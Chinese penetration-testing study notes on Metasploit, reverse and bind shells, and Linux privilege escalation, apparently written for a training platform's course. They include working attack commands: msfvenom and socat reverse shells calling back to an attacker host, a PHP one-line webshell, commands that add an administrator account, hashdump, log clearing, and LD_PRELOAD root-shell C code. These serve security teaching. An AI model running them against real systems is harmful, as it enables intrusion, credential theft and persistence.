## Vulnerability Research
### 漏洞101
- 漏洞介绍
  - 系统或应用程序的设计、实施或行为中的弱点或缺陷
  - 主要类型
    1. 操作系统。存在于操作系统中，通常导致提权。
    2. 基于配置。
    3. 弱口令或默认。
    4. 应用逻辑。
    5. 人为因素。
  - 通常对操作系统和应用逻辑进行关注
- 漏洞评分
  - 通用漏洞评分系统( CVSS )
    - 2005年首次推出
    - 评分主要依据
      1. 漏洞利用的难度
      2. 是否存在对此漏洞的利用
      3. 漏洞对 CIA 三要素的影响 
  - 漏洞优先级评级 ( VPR )
    - 基于风险驱动的
- 漏洞数据库
  - [NVD](https://nvd.nist.gov/vuln/full-listing)
  - [Exploit-DB](http://exploit-db.com/)
  - 常见概念
    - Vulnerability(漏洞)
      - 漏洞被定义为系统或应用程序的设计、实现或行为中的弱点或缺陷
    - Exploit
      - 漏洞利用是诸如利用系统或应用程序漏洞的操作或行为
    - Proof of Concept (PoC)	
      - 概念验证是一种经常演示漏洞利用的技术或工具
      - 概念验证经常被用来作为0day、exploit的别名。（通常指并没有充分利用这个漏洞的exploit）
### 漏洞利用
- 自动/手动扫描
  - 漏洞扫描器 Nessus
  - 手动扫描漏洞通常是渗透测试人员在测试单个应用程序或程序时选择的武器。事实上，手动扫描将涉及搜索相同的漏洞并使用与自动扫描类似的技术
  - 殊途同归的是，这两项技术都是测试应用或程序的漏洞
    - Security Misconfigurations(安全配置错误)
    - Broken Access Control	(错误的访问控制)
    - Insecure Deserialization(不安全的反序列化)
    - Injection(注入)
  - [OWASP 框架]()
- 查询手动利用漏洞
  - [Rapid7](https://www.rapid7.com/db/)
  - github
  - Searchsploit
    - Exploit-DB 的离线版本
- 实例
  1. 网站首页，发现版本`Online Book Store 1.0`
  2. Exploit-DB 搜索，发现 RCE 漏洞，下载漏洞利用脚本
  3. 运行脚本
## Metasploit
### Metasploit简介
- 介绍
  - Metasploit有两个版本
    1. Metasploit Pro 商业版
    2. Metasploit Framework
  - Metasploit Framework主要组成
    1. msfconsole 命令行入口
    2. Modules 模块，如 exploits,scanners,payloads
    3. Tools 有助于漏洞研究、漏洞评估或渗透测试的独立工具, 如 msfvenom,pattern_create,pattern_offset
- 主要组件
  - 使用Metasploit Framework时 ,主要与 Metasploit 控制台进行交互.使用 `msfconsole`进入
  - 组件
    1. Auxiliary(辅助): 任何支持辅助模块，如扫描器、爬虫和模糊器
   
        ![Auxiliary](image/Auxiliary.png)
    2. Encoders(编码器): 允许对漏洞和有效载荷进行编码，以应对基于签名的防病毒策略
       
        ![Encoders](image/Encoders.png)
    3. Evasion(规避): 虽然编码器会对有效负载进行编码，但不应将其视为逃避防病毒软件的直接尝试。因为该模块会尝试规避防病毒策略

        ![Evasion](image/Evasion.png)
    4. Exploits: 漏洞利用，根据目标系统类型进行统一的分类
   
        ![Exploits](image/Exploits.png)   
    5. NOP：NOP（No OPeration）什么都不做。在 Intel x86 CPU 系列中以 0x90 表示，之后 CPU 将在一个周期内不执行任何操作。通常用作缓冲区以实现一致的有效负载大小

        ![NOP](image/NOPs.png)  
    6. Payloads: 有效载荷是将在目标系统上运行的代码

        ![Payloads](image/Payloads.png)
        - 在目标系统上运行命令渗透测试的一个重要的步骤，一个允许您键入可以在目标系统上执行命令的交互式连接可以实现该步骤。这样的交互式命令行称为`shell`。
        - Metasploit 提供了发送不同有效载荷的能力，这些有效载荷可以在目标系统上打开 `shell`
        - 三个不同的目录
          - Singles: 独立的Payload,无需下载额外的组件即可运行,例如 添加用户，运行 notepad.exe 等
          - Stagers: 负责建立 Metasploit 和目标系统的连接通道,是分阶段的,初始 Payload 大小相对较小
          - Stages
        - Singles 和 Stagers的辨认
          - `generic/shell_reverse_tcp`
          - `windows/x64/shell/reverse_tcp`
          - shell`_`reverse_tcp 属于 Singles
          - shell`/`reverse_tcp 属于 Stagers
    7. Post： Post 模块将在上面列出的渗透测试过程的最后阶段，post-exploitation 中很有用

        ![Post](image/Post.png)  
- Msfconsole
  - 可像一般shell一样运行命令，如`ls` `clear` `ping` 等，不过不支持重定向 `>`
  - `history`
  - `use exploit/windows/smb/ms17_010_eternalblue`
    - `show options`
    - `show payloads`
    - `info`
  - `search`
    - `search ms17-010`
    - `search type:auxiliary telnet`
- Working with modules
  - `use exploit/windows/smb/ms17_010_eternalblue`
    - `show options`
    - `set rhosts 1.1.1.1` `set rhosts target.txt`
    - 常用参数
      - `RHOSTS`
      - `RPORT`
      - `PAYLOADS`
      - `LHOST`
      - `LPORT`
    - `unset all`
    - `setg rhosts 1.1.1.1` 全局变量
    - `unsetg rhosts 1.1.1.1`

### Metasploit: Exploitation
- 扫描
  - 端口扫描
    - `search portscan`
  - UDP 服务标识
    - `scanner/discovery/udp_sweep`
  - SMB 扫描
    - `smb_enumshares`
    - `smb_version`
  - 引申：SMB 协议工作原理
    1. 客户端发送 SMB negotiate protocol request请求数据报，并列出所支持的所有SMB协议版本

        ![SMB negotiate protocol request](image/SMB%20negotiate%20protocol%20request.jpg)
        - 0x0202 　　 SMB 2.002
        - 0x0210 　　 SMB 2.1
        - 0x0300 　　 SMB 3.0
        - 0x0302 　　 SMB 3.02
        - 0x02FF 　　 SMB2
    2. 服务器收到请求信息后响应请求，并列出希望使用的协议版本。如果没有可使用的协议版本则返回0XFFFFH并结束通信。

        ![SMB negotiate protocol response](image/negotiate%20protocol%20response.jpg)
        - 可以看到服务端希望使用的版本是SMB2.1 
        - 注意:win7默认开启smbv1(只要开启共享服务),但是由于windows的安全机制,版本协商就高不就低,除非客户端版本只有SMBv1或者服务端只有SMBv1
        - 这里就可以利用了:客户端可以恶意把版本设置为只能是SMBv1,这样服务端和客户端协商通过只能用SMBv1
    3. 协议确定后，客户端进程向服务器发起一个用户或共享的认证，这个过程是通过发送session setup request请求数据报实现的。客户端发送一对用户名和密码或一个简单密码到服务器。

        ![SMB session setup request](image/session%20setup%20request.jpg)
    4. 服务器通过发送一个Session setup response应答数据报来允许或拒绝本次连接

        ![SMB session setup response](image/Session%20setup%20response.jpg)
    5. 当客户端和服务器完成了磋商和认证之后，它会发送一个Tree connect rerquest SMB数据报并列出它想访问网络资源的名称　　

        ![SMB Tree connect rerquest](image/Tree%20connect%20rerquest.jpg)
    6. 服务器会发送一个tree connect response应答数据报以表示此次连接是否被接受或拒绝　　 
     
        ![SMB Tree connect response](image/tree%20connect%20response.jpg)    
    7. 连接到相应资源后，SMB客户端就能够进行操作

        ![SMB操作](image/smb%E6%93%8D%E4%BD%9C.jpg)     
- Metasploit 数据库
  - 实际的渗透测试参与可能会有多个目标，Metasploit 具有数据库功能，可简化项目管理并避免在设置参数值时可能出现的混淆
  - 使用 `Postgresql`数据库
    - `systemctl start postgresql`
  - `msfdb init`命令初始化 Metasploit 数据库
  - 在`msfconsole`中使用 `db_status` 确认数据库状态
  - 创建工作区以隔离不同的项目
    - `workspace`
    - `workspace -a ` 创建工作区
    - `workspace -d`  删除工作区
  - Metasploit 数据库启动后，`help` 显示基于数据库的相关命令
    - 例如使用`db_nmap`,所有的结果都将保存在数据库中
    - 扫描完成后，使用`hosts`和`services`可以得到目标系统的相关信息
    - `hosts -R`可以设置 RHOSTS 参数的值
    - `services -S netbios` 检索指定的服务类型
- 漏洞扫描
  - Metasploit 可以快速识别一些 "low hanging fruit" 的关键漏洞。这些漏洞可能会让攻击者在系统上站稳脚跟，在某些情况下，还可以获得高级权限，例如 root 或管理员
  - 漏洞扫描的结果取决于目标扫描的完成度
  - 使用`search`搜索相关服务，查找漏洞
    - `search vnc`
    - `use auxiliary/scanner/vnc/vnc_login`
    - `info`
- Exploitation
  1. `search` 查找合适的 exploit
  2. `show options`
  3. `show payloads`
  4. `set payload`
  5. `exploit`
  - 后台`CTRL+Z` 
  - 中止`CTRL+C`
  - `sessions`
- Msfvenom
  - 用于代替 Msfpayload 和 Msfencode,生成 payload
  - Msfvenom 可以访问 Metasploit 框架中可用的所有 payload
  - Msfvenom 可以以多种不同的格式（PHP、exe、dll、elf 等）和针对多种不同的目标系统（Apple、Windows、Android、Linux 等）创建 payload
  - 举例：生成反向shell
    `msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php`
  
### Metasploit: Meterpreter
- Meterpreter介绍
  - 通过 Meterpreter 与目标操作系统和文件进行交互，并使用 Meterpreter 的专用命令
  - Meterpreter 运行在内存，使用`getpid`获得进程id
  - 使用 `ps` 列出目标系统运行的进程
  - Meterpreter payloads 也分两种， `stagged` 和 `inline`
  - `msfvenom --list payloads | grep meterpreter`
- Meterpreter命令
  - `help` 列出所有命令
  - Core commands (核心命令)
    - `background`
    - `exit`
    - `migrate`
    - `guid` 获取会话 GUID（全局唯一标识符）
    - ...
  - File system commands
    - `cd`
    - `ls`
    - `pwd`
    - `edit`
    - `cat`
    - `rm`
    - `search`
    - `upload`
    - `download`
  - Networking commands
    - `arp`
    - `ifconfig`
    - `netstat`
    - `portfwd` 将本地端口转发到远程服务
    - `route` 查看和修改路由表
  - System commands
    - `clearev` 清除事件日志
    - `execute` 执行命令
    - `getpid` 显示当前进程标识符
    - `getuid` 显示 Meterpreter 正在运行的用户
    - `kill` 
    - `pkill`
    - `ps`
    - `reboot`
    - `shell`
- 后期利用
  - `help`
  - `getuid`
  - `ps`
  - `Migrate`
    - `migrate 716` 迁移到进程716
  - `hashdump` 列出 SAM 数据库的内容
  - `search`
    - `search -f flag2.txt`
  - `shell`
- 实践
  - `sysinfo`

## Privilege Escalation
### What the Shell?
- 工具
  - 我们将使用多种工具来接收反向 shell 和发送绑定 shell。
  - 一般而言，我们需要恶意 shell 代码，以及与生成的 shell 交互的方法。
  - Netcat
  - Socat 更牢固的Netcat
  - Metasploit中的 multi/handler 模块
  - Msfvenom 生成payloads工具
- Shell的类型
  - 反向shell(Reverse shell)
    - 目标连接回攻击者的主机
  - 绑定shell(Bind shell)
    - 指在目标上执行的代码用于启动直接在目标上附加到 shell 的侦听器。然后这将向互联网开放，这意味着您可以连接到代码打开的端口并以这种方式获得远程代码执行。这具有不需要在您自己的网络上进行任何配置的优点，但可能会被保护目标的防火墙阻止。
  - 交互式和非交互式( interactive or non-interactive )
    - 如果使用 Powershell、Bash、Zsh、sh 或任何其他标准 CLI 环境，这些属于交互式shell。这些shell允许您在执行程序后与程序进行交互。例如，采用 SSH 登录提示。
  
      ![Interactive_shell](image/Interactive_shell.png)
    - 在非交互式 shell 中，您只能使用不需要用户交互即可正常运行的程序。不幸的是，大多数简单的反向和绑定 shell 都是非交互式的，这会使进一步的利用变得更加棘手。在非交互式 shell 中运行 SSH 时,发现没有任何回应。  
      
      ![Non-Interactive_shell](image/Non-interactive_shell.png)
- Netcat
  - Reverse Shells
    - `nc -lvnp <port-number>`
      - **-l** 监听器
      - **-v** 详细输出
      - **-n** 不解析主机名或使用DNS
      - **-p** 遵循端口规范
  - Bind Shells
    - `nc <target-ip> <chosen-port>`
      - `nc 10.10.10.10 8080`
- 稳定Netcat shell
  - 已经捕获或连接到一个 netcat shell。
  - 默认情况下，这些 shell 非常不稳定。按 Ctrl + C 会断开连接。
  - 它们是非交互式的，并且经常有奇怪的格式错误。
  - 这是因为 netcat shell实际上是在终端内运行的进程，而不是真正的终端本身。
  - 方法一:Python
    - 适用于Linux系统。
    - 分为三步
      - 使用 `python3 -c 'import pty;pty.spawn("/bin/bash")'`,注意python版本；此时我们的 shell 看起来会更漂亮一些，但我们仍然无法使用 tab 自动完成或箭头键，而 Ctrl + C 仍会终止 shell。
      - 使用 `export TERM=xterm`
      - 使用 Ctrl + Z 后台运行Shell，使用`stty raw -echo; fg`
        - `stty raw -echo` 关闭自身终端回显(使用`reset`恢复)
        - `fg` 将后台程序转入前台执行
  
      ![Python_Stabilisation_shell](image/Python_Stabilisation_shell.png)
  - 方法二：rlwrap
    - `rlwrap nc -lvnp <port>`
    - 在 windows 上可以使用。
  - 方法三：Socat
    - **`python3 -m http.server <port>`**
    - Reverse Shell
      - 本地监听
        - `socat TCP-L:<port> -`
      - 回连
        - `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`
          - **pipes** 强制 powershell 使用Unix风格
        - `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`
    - Bind Shell
      - 远程监听
        - `socat TCP-L:<port> EXEC:powershell.exe`
        - `socat TCP-L<port> EXEC:"bash -li"`
      - 本地连接
        - `socat TCP:<TARGET-IP>:<TARGET-PORT> -`
    - Socat稳定Reverse Shell
      - 本地监听
        - ``socat TCP-L:<port> FILE:`tty`,raw,echo=0 ``
      - 远程回连
        - `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
          - **pty**，在目标上分配一个伪终端——稳定过程的一部分
          - **stderr**，确保任何错误消息都显示在 shell 中（通常是非交互式 shell 的问题）
          - **sigint**，将任何 Ctrl + C 命令传递到子进程中，允许我们在 shell 中终止命令
          - **setsid**，在新会话中创建进程
          - **sane**，稳定终端，试图“正常化”它。

      ![Socat_1](image/socat_1.jpg)
- Common Shell Payloads
  - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
  - Linux命令中的重定向(>)和管道(|)
    - 文件描述符
      - Linux的宗旨是一切皆文件，对于进程、IO等等都是通过文件的形式存在，这些文件都通过文件描述符的形式来表示。
      - Linux启动时，最开始会创建init进程，其余的程序都是这个进程的子进程。而init进程默认打开3个文件描述符：
        - 标准输入：standard input(0)
        - 标准输出：standard output(1)
        - 标准错误：standard error(2)
    - 重定向
      - 输出重定向
        - `ls exists.txt no-exists.txt 1 > success.txt 2 > fail.txt`
        - 关闭标准错误信息
          - `ls exists.txt no-exists.txt 2 > /dev/null`
          - `ls exists.txt no-exists.txt 2 > &-`
        - 关闭所有输出
          - `ls exists.txt no-exists.txt 1 > /dev/null 2 > /dev/null`
          - `ls exists.txt no-exists.txt 1 > &- 2 > &-`
          - `ls exists.txt no-exists.txt 2 > &1 1 > /dev/null`
      - 输入重定向
        - `cat > output.txt  < input.txt`
          - 类似于复制
      - 管道
        - `cat test.txt | grep -n 'test'`
- msfvenom
  - msfvenom 是Metasploit框架的一部分，主要用于生成反向和绑定 shell 的代码
  - 标准语法
    - `msfvenom -p <PAYLOAD> <OPTIONS>`
    - 示例
      - `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`

        ![msfvenom01](image/msfvenom01.png)
        - -f \<format\>
          - 输出的文件类型，这里是 exe 可执行文件
        - -o \<file\>
          - 输出的文件名称
  - PAYLOAD的命名规则
    - [回顾](https://github.com/MasterandRoot/Learn-THM/blob/main/Jr%20Penetration%20Tester/Vulnerability%20Research.md#metasploit%E7%AE%80%E4%BB%8B)
    - `<OS>/<arch>/<payload>`
      - `linux/x86/shell_reverse_tcp` x86 linux 下的 singles shell
      - `windows/shell_reverse_tcp` 默认x64 windows 下的 singles shell
    - `msfvenom --list payloads` 列出所有有效载荷，可使用 grep 分类
    
      ![msfvenom02](image/msfvenom02.png)

- multi/handler
  - `exploit -j` 后台运行
  - `sessions <number>` 选择会话到前台
  
    ![Multi_Handler01](image/Multi_Handler01.png)

    ![Multi_Handler02](image/Multi_Handler02.png)

- WebShell
  - “Webshel​​l”是一个通俗术语，指在网络服务器（通常采用PHP或 ASP 等语言）内部运行的脚本，该脚本在服务器上执行代码。本质上，命令是通过 HTML 表单或直接作为 URL 中的参数输入到网页中的，然后由脚本执行，返回结果并写入页面。
  - [上传文件漏洞]()
  - php一句话脚本
    - `<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
      - `shell_exec()` 通过shell执行命令，并将输出结果回显
      - `$_GET` 获得 url 中参数的值
- Next step
  - 通过之前的步骤，即使是生成了 稳定Shell 也不是最理想的，它们永远不会像本机shell那样功能齐全。
    - 理想情况下，在Linux系统中，在 `/home/<user>/.ssh` 存储的SSH密钥能帮助实现SSH登录；脏牛漏洞或者可写的`/etc/shadow` `/etc/passwd` 文件也是方式之一。
    - 理想情况下，在windows系统中，有时在注册表中找到正在运行的服务的密码，例如VNC服务器经常将密码以明文形式存储在注册表中；某些版本的FileZilla FTP服务器会将凭据保留在`C:\Program Files\FileZilla Server\FileZilla Server.xml`或`C:\xampp\FileZilla Server\FileZilla Server.xml`的XML文件中。
    - 理想情况下，在windows系统中，您将以SYSTEM用户身份运行Shell，这时只需将自己的账户添加到计算机，然后通过RDP、telnet、winexe等方式登录。语法如下：
      - `net user <username> <password> /add`
      - `net localgroup administrators <username> /add`
- 实践

### Linux Privilege Escalation
- 介绍
  - 从本质上讲，权限升级通常涉及从权限较低的帐户到权限较高的帐户。
  - 从技术上讲，它是利用操作系统或应用程序中的漏洞、设计缺陷或配置监督来获得对通常限制用户访问的资源的未经授权的访问。
- 枚举
  - hostname
    - 返回目标的主机名。通常无意义。
    - 但在某些情况下，它可以提供有关目标系统在企业网络中的角色的信息（例如用于生产 SQL 服务器的 SQL-PROD-01 ）
  - uname -a
    - 打印系统信息。提供有关系统使用的内核的更多详细信息
    - 导致权限升级的潜在内核漏洞时非常有用
  - /proc/version
    - 查看 /proc/version 会提供有关内核版本的信息以及其他数据，例如是否安装了编译器（例如 GCC）
  - /etc/issue 
    - 该文件通常包含一些有关操作系统的信息
  - ps
    - 查看进程。
    - `ps -A` 查看所有正在运行的进程
    - `ps axjf` 进程树 
    - `ps aux` 
      - a 显示所有用户的进程
      - u 显示启动进程的用户
      - x 显示未连接到终端的进程
  - env
    - 环境变量。
      - PATH 变量可能具有编译器或脚本语言，可用于提升权限
  - sudo -l
    - 列出用户可以使用 sudo 运行的所有命令
  - ls
  - id
  - /etc/passwd
    - 引申 /etc/passwd 格式类型
      
      ![/etc/passwd格式](image/etc_passwd_01.jpg)
      
      - `Username` 系统登录时输入的用户名
      - `Password`  密码，存储在`/etc/shadow`中
      - `UID` 用户标识号
      - `GID` 用户组标识号
      - `GECOS` 用户信息，用户的全名或应用程序名称，地址，工作电话号码，电话号码，其他联系信息
      - `Home directory` 用户家目录的绝对路径。它包含用户的配置文件。默认情况下，用户家目录以用户名命名，并创建在 /home 目录下
      - `login shell` 登录 Shell。用户登录Shell程序的绝对路径。这是用户登录系统时启动的 Shell 程序
    - 引申 /etc/shadow 格式类型

      ![/etc/shadow格式](image/etc_shadow.jpg)

      - `Username` 用户名。登录系统时输入的用户名。每个用户名在计算机上必须是唯一的字符串。用户名的最大长度限制为32个字符
      - `Encrypted Password` 加密密码，密码使用 \$type\$salt\$hashed 格式。   $type 是密码哈希算法，可能的值：
        - \$1$ – MD5
        - \$2a$ – salt
        - \$2y$ – Eksblowfish
        - \$5$ – SHA-256
        - \$6$ – SHA-512
      - `Last password change` 上次更改密码的日期。从1970年1月1日（纪元日期）开始计算天数
      - `Minimum password age` 修改用户密码之前必须经过的天数。通常将其设置为零，这意味着没有最小密码年龄期限
      - `Maximum password age` 多少天后必须更改用户密码。默认情况下，此数字设置为 99999 
      - `Warning period` 警告周期，也就是闲置期。在密码过期之前，警告用户必须修改密码。用户密码过期后，禁用用户帐户之前的天数。通常，此字段为空
      - `Expiration date` 到期日期。帐户被禁用的日期
      - `Unused` 未使用，该字段被忽略，它保留供将来使用

        ```
        myfreax:$6$zHvrJMa5Y690smbQ$z5zdL...:18009:0:120:7:14::
        · 条目包含用户 myfreax 密码的信息。
        · 密码已使用SHA-512加密，为了更好的可读性，密码已被截断。
        · 密码最后一次更改是在2019年4月23日 18009。
        · 没有密码使用期限的下限。
        · 必须至少每120天更改一次密码。
        · 用户将在密码到期日期的前7天收到警告消息。
        · 如果用户在密码过期14天后仍未尝试登录系统，则该帐户将被禁用。
        · 没有帐户有效期。
        ```
  - history
  - ifconfig
  - netstat
    - `netstat` 已过时，已被 `ss` 和 `ip` 命令取代，但它仍然是检查网络连接的最常用命令
    - 最常用 —— 查找端口占用 
      - `netstat -tunlp`
        - -t 显示TCP端口
        - -u 显示UDP端口
        - -n 显示数字地址而不是解析主机
        - -l 仅显示监听端口
        - -p 显示监听端口的进程PID和名称
        - 例: `netstat -tnlp | grep :22 ` 查看 22 端口的占用
      - `ss -tunlp`
    - 引申 `ip` 
      - [ip命令的用法](http://linux.51yip.com/search/ip)
  - find
    - `find . -name flag1.txt`: 在当前目录下寻找“flag1.txt”文件
    - `find /home -name flag1.txt`: 在 /home 目录下寻找“flag1.txt”文件
    - `find / -type d -name config`: 在 “/” 目录下查找名为 “config” 的目录
    - `find / -type f -perm 0777`: 查找具有777权限的文件（所有用户可读、可写、可执行的文件）
      - 文件权限引申
        - `-rwxrwxrwx`  777
          - r = 4 w = 2 x = 1 
        - SUID `-perm 0777` 0 就是该位置
          - [SUID]()
          - `-rwsr-xr-x`  4755
          - SUID -> 4 
          - SGID-> 2
          - SBIT->1
    - `find / -perm a=x`: 查找所有可执行文件
    - `find /home -user frank`: 在“/home”下查找用户“frank”的所有文件
    - `find / -mtime 10`: 查找最近 10 天内修改过的文件
    - `find / -atime 10`: 查找过去 10 天内访问过的文件
    - `find / -cmin -60`: 查找过去一小时（60 分钟）内更改的文件
    - `find / -amin -60`: 查找过去一小时（60 分钟）内访问的文件
    - `find / -size +50M`: 查找大于50MB的文件
      - 大于100MB的时候容易报错，使用`-type f 2>/dev/null`
    - 3种方式查找可写文件夹
      - `find / -writable -type d 2>/dev/null`：查找全局可写文件夹
      - `find / -perm -222 -type d 2>/dev/null`：查找全局可写文件夹
      - `find / -perm -o w -type d 2>/dev/null`：查找全局可写文件夹 (**经实践不好用**)
    - `find / -perm -u=s -type f 2>/dev/null`
  - cut 在文件的每一行中提取片断
  - grep 
    - grep （global search regular expression(RE) and print out the line,全面搜索正则表达式并把行打印出来）是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来
    - grep 可用于shell脚本，因为grep通过返回一个状态值来说明搜索的状态，如果模板搜索成功，则返回 0，如果搜索不成功，则返回 1，如果搜索的文件不存在，则返回 2
- 自动枚举
  - 一些常见的自动枚举工具
    - LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
    - LinEnum: https://github.com/rebootuser/LinEnum
    - LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
    - Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
    - Linux Priv Checker: https://github.com/linted/linuxprivchecker
- 权限提升 —— 内核漏洞
  - 信息来源
    - 根据内核信息，Google查询
    - 相关信息网站 https://www.linuxkernelcves.com/cves
    - 一些自动枚举工具 LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
  - 注意事项
    - Google, Exploit-db, searchsploit 中搜索漏洞时非常具体
    - 启动漏洞利用代码之前，请确保了解其工作原理。某些漏洞利用代码可以对操作系统进行更改，从而使它们在进一步使用时不安全，或者对系统进行不可逆转的更改，从而在以后产生问题。当然，这些在实验室或 CTF 环境中可能不是大问题，但在真正的渗透测试过程中这些绝对是禁忌
    - 有些漏洞一旦运行可能需要进一步的交互。阅读漏洞利用代码提供的所有注释和说明。
    - 可以使用 Python 中 SimpleHTTPServer 模块从本地计算机传输到目标系统，目标系统通过 wget 接收 。 
  - 实践
    - 查找内核 `uname -a` 或 `cat /proc/version`, 内核版本为 3.13.0 
    - 使用 Exploit-db 查询, 发现漏洞 CVE-2015-1328 
    - 利用漏洞代码提权
- 权限提升 —— Sudo
  - `sudo -l`命令检查其当前与root权限相关的情况
  - 利用应用程序功能
    - 在 Apache2 应用程序中，Apache2 有一个选项支持加载备用配置文件（-f：指定备用 ServerConfigFile）
    - 使用此选项加载 `/etc/shadow` 文件将导致一条错误消息，其中包括文件的第一行
  - Leverage LD_PRELOAD
    - 在某些系统上，您可能会看到 LD_PRELOAD 环境选项
  
      ![LD_PRELOAD](image/LD_PRELOAD.png)

    - LD_PRELOAD 是一个允许任何程序使用共享库的函数。如果启用“env_keep”选项，我们可以生成一个共享库，该库将在程序运行之前加载并执行
    - 请注意，如果真实用户 ID 与有效用户 ID 不同，LD_PRELOAD 选项将被忽略
    - 利用步骤
      - 检查 LD_PRELOAD（ env_keep 选项）
      - 编写一个简单的 C 代码编译为共享对象（.so 扩展名）文件
      - 使用 sudo 权限和指向我们的 .so 文件的 LD_PRELOAD 选项运行程序
    - 实践
      - 编写简单的C代码
        ```C
          #include <stdio.h>
          #include <sys/types.h>
          #include <stdlib.h>

          void _init() {
            unsetenv("LD_PRELOAD");
            setgid(0);
            setuid(0);
            system("/bin/bash");
          }
        ```
      - 将此代码保存为 shell.c，并使用 gcc 使用以下参数将其编译为共享对象文件
        ```
          gcc -fPIC -shared -o shell.so shell.c -nostartfiles
        ```
      - 现在，当启动可以使用 sudo 运行的任何程序时，可以使用此共享对象文件
      - 例如 find 或任何可以使用 sudo 运行的程序 
        ```
          sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
        ```
      - 此时得到一个具有root权限的shell
- 权限提升 —— SUID
  - 作为普通用户，如果想执行某些只有管理员才有权限的操作，以前只有两种办法
    - 一是通过 sudo 提升权限，如果用户很多，配置管理和权限控制会很麻烦
    - 二是通过 SUID（Set User ID on execution）来实现，它可以让普通用户允许一个 owner 为 root 的可执行文件时具有 root 的权限
  - SUID 的概念比较晦涩难懂，举个例子就明白了，以常用的 passwd 命令为例，修改用户密码是需要 root 权限的，但普通用户却可以通过这个命令来修改密码，这就是因为 /bin/passwd 被设置了 SUID 标识，所以普通用户执行 passwd 命令时，进程的 owner 就是 passwd 的所有者，也就是 root 用户
  - SUID 虽然可以解决问题，但却带来了安全隐患。当运行设置了 SUID 的命令时，通常只是需要很小一部分的特权，但是 SUID 给了它 root 具有的全部权限。这些可执行文件是黑客的主要目标，如果他们发现了其中的漏洞，就很容易利用它来进行安全攻击。简而言之，SUID 机制增大了系统的安全攻击面
  -  SUID（集用户标识）和 SGID（集组标识）
  - `find / -type f -perm -04000 -ls 2>/dev/null` 将列出设置了 SUID 位的文件
    - **-04000** 是头文件 sys/stat.h 定义的 SUID 符号常量
  - 将查询到的可执行文件与 GTFOBins ( https://gtfobins.github.io ) 进行比较
- 权限提升 —— Capabilities
  - 由于 SUID 的粗颗粒度，为了对 root 权限进行更细的控制，实现按需授权，Linux 引入了另一种机制叫 capabilities
  - Capabilities 机制是在 Linux 内核 2.2 之后引入的，原理很简单，就是将之前与超级用户 root（UID=0）关联的特权细分为不同的功能组，Capabilites 作为线程（Linux 并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中
  - 这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是 root，就去检查其是否具有该特权操作所对应的 capabilities，并以此为依据，决定是否可以执行特权操作
  - Capabilities 可以在进程执行时赋予，也可以直接从父进程继承。所以理论上如果给 nginx 可执行文件赋予了 `CAP_NET_BIND_SERVICE` capabilities，那么它就能以普通用户运行并监听在 80 端口上
  - 使用 `getcap -r / 2>/dev/null` 列出启用的功能
  - 将查询到的结果与 GTFOBins ( https://gtfobins.github.io ) 进行比较
- 权限提升 —— Cron Jobs
  - Cron jobs 用于在特定时间运行脚本或二进制文件。默认情况下，它们以其所有者的权限运行，而不是以当前用户的权限运行。虽然正确配置的 cron 作业本身并不容易受到攻击，但它们在某些情况下可以提供权限升级向量
  - 使用 `cat /etc/crontab` 列出计划任务
    - 如果有一个以 root 权限运行的计划任务，并且我们可以更改将运行的脚本，那么我们的脚本将以 root 权限运行
    - 第二种情况也并不少见：
      1. 系统管理员需要定期运行脚本
      2. 他们创建了一个 cron 作业来执行此操作
      3. 一段时间后，脚本变得毫无用处，他们将其删除
      4. 他们不清理相关的 cron 作业
      5. 如果未定义该脚本的完整路径，cron 将引用 /etc/crontab 文件中 PATH 变量下列出的路径
      6. 在这种情况下，我们应该能够在用户的主文件夹下创建一个相同名称的脚本，并且它应该由 cron 作业运行
- 权限提升 —— PATH
  - Linux中的 PATH 是一个环境变量，它告诉操作系统在哪里搜索可执行文件
  - 对于任何未内置到 shell 中或未使用绝对路径定义的命令，Linux 将开始在 PATH 下定义的文件夹中搜索
  - 使用 `echo $PATH` 查看当前环境变量
  - 进行攻击之前确认以下事项：
    1. `$PATH` 下有哪些文件夹
    2. 当前用户是否拥有这些文件夹的写入权限
    3. `$PATH` 能否修改
    4. 使用的脚本/应用程序是否会受到此漏洞的影响(下图为使用的演示脚本，注意到使用的是root用户创建，实际利用时应需要寻找存在漏洞的程序或脚本)
        ![使用的脚本](image/PATH.png)

  - 利用步骤
    1. 找寻存在漏洞的应用程序或脚本
    2. 查找在 `$PATH` 中是否存在可写入文件夹
    3. 若不存在，测试 `$PATH` 能否修改，若能修改，把可写入文件夹加入 `$PATH`
    4. 可执行文件 `echo "/bin/bash" > thm`
    5. 启动存在漏洞的应用程序或脚本
- 权限提升 —— NFS
  - NFS（网络文件共享）配置保存在 /etc/exports 文件中，该文件是在 NFS 服务器安装期间创建的，通常可供用户读取
    - `cat /etc/exports`
  - 利用NFS提权的关键是“no_root_squash”选项
  - 默认情况下，NFS 会将 root 用户更改为 nfsnobody，并禁止以 root 权限操作任何文件
  - 如果可写共享上存在“no_root_squash”选项，我们可以创建一个设置了 SUID 位的可执行文件并在目标系统上运行它

    ![nfs](image/nfs.png)

  - 利用步骤
    1. 枚举目标机器上的可安装共享
    2. 把存在“no_root_squash”选项共享安装到我们的攻击机器上并开始构建我们的可执行文件
    3. 我们可以设置 SUID 位，因此在目标系统上运行 /bin/bash 的简单可执行文件将完成这项工作
      ![nfs1](image/nfs1.png)
      ![nfs2](image/nfs2.png)
      ![nfs3](image/nfs3.png)
  
- 权限提升 —— 实践
### Windows Privilege Escalation
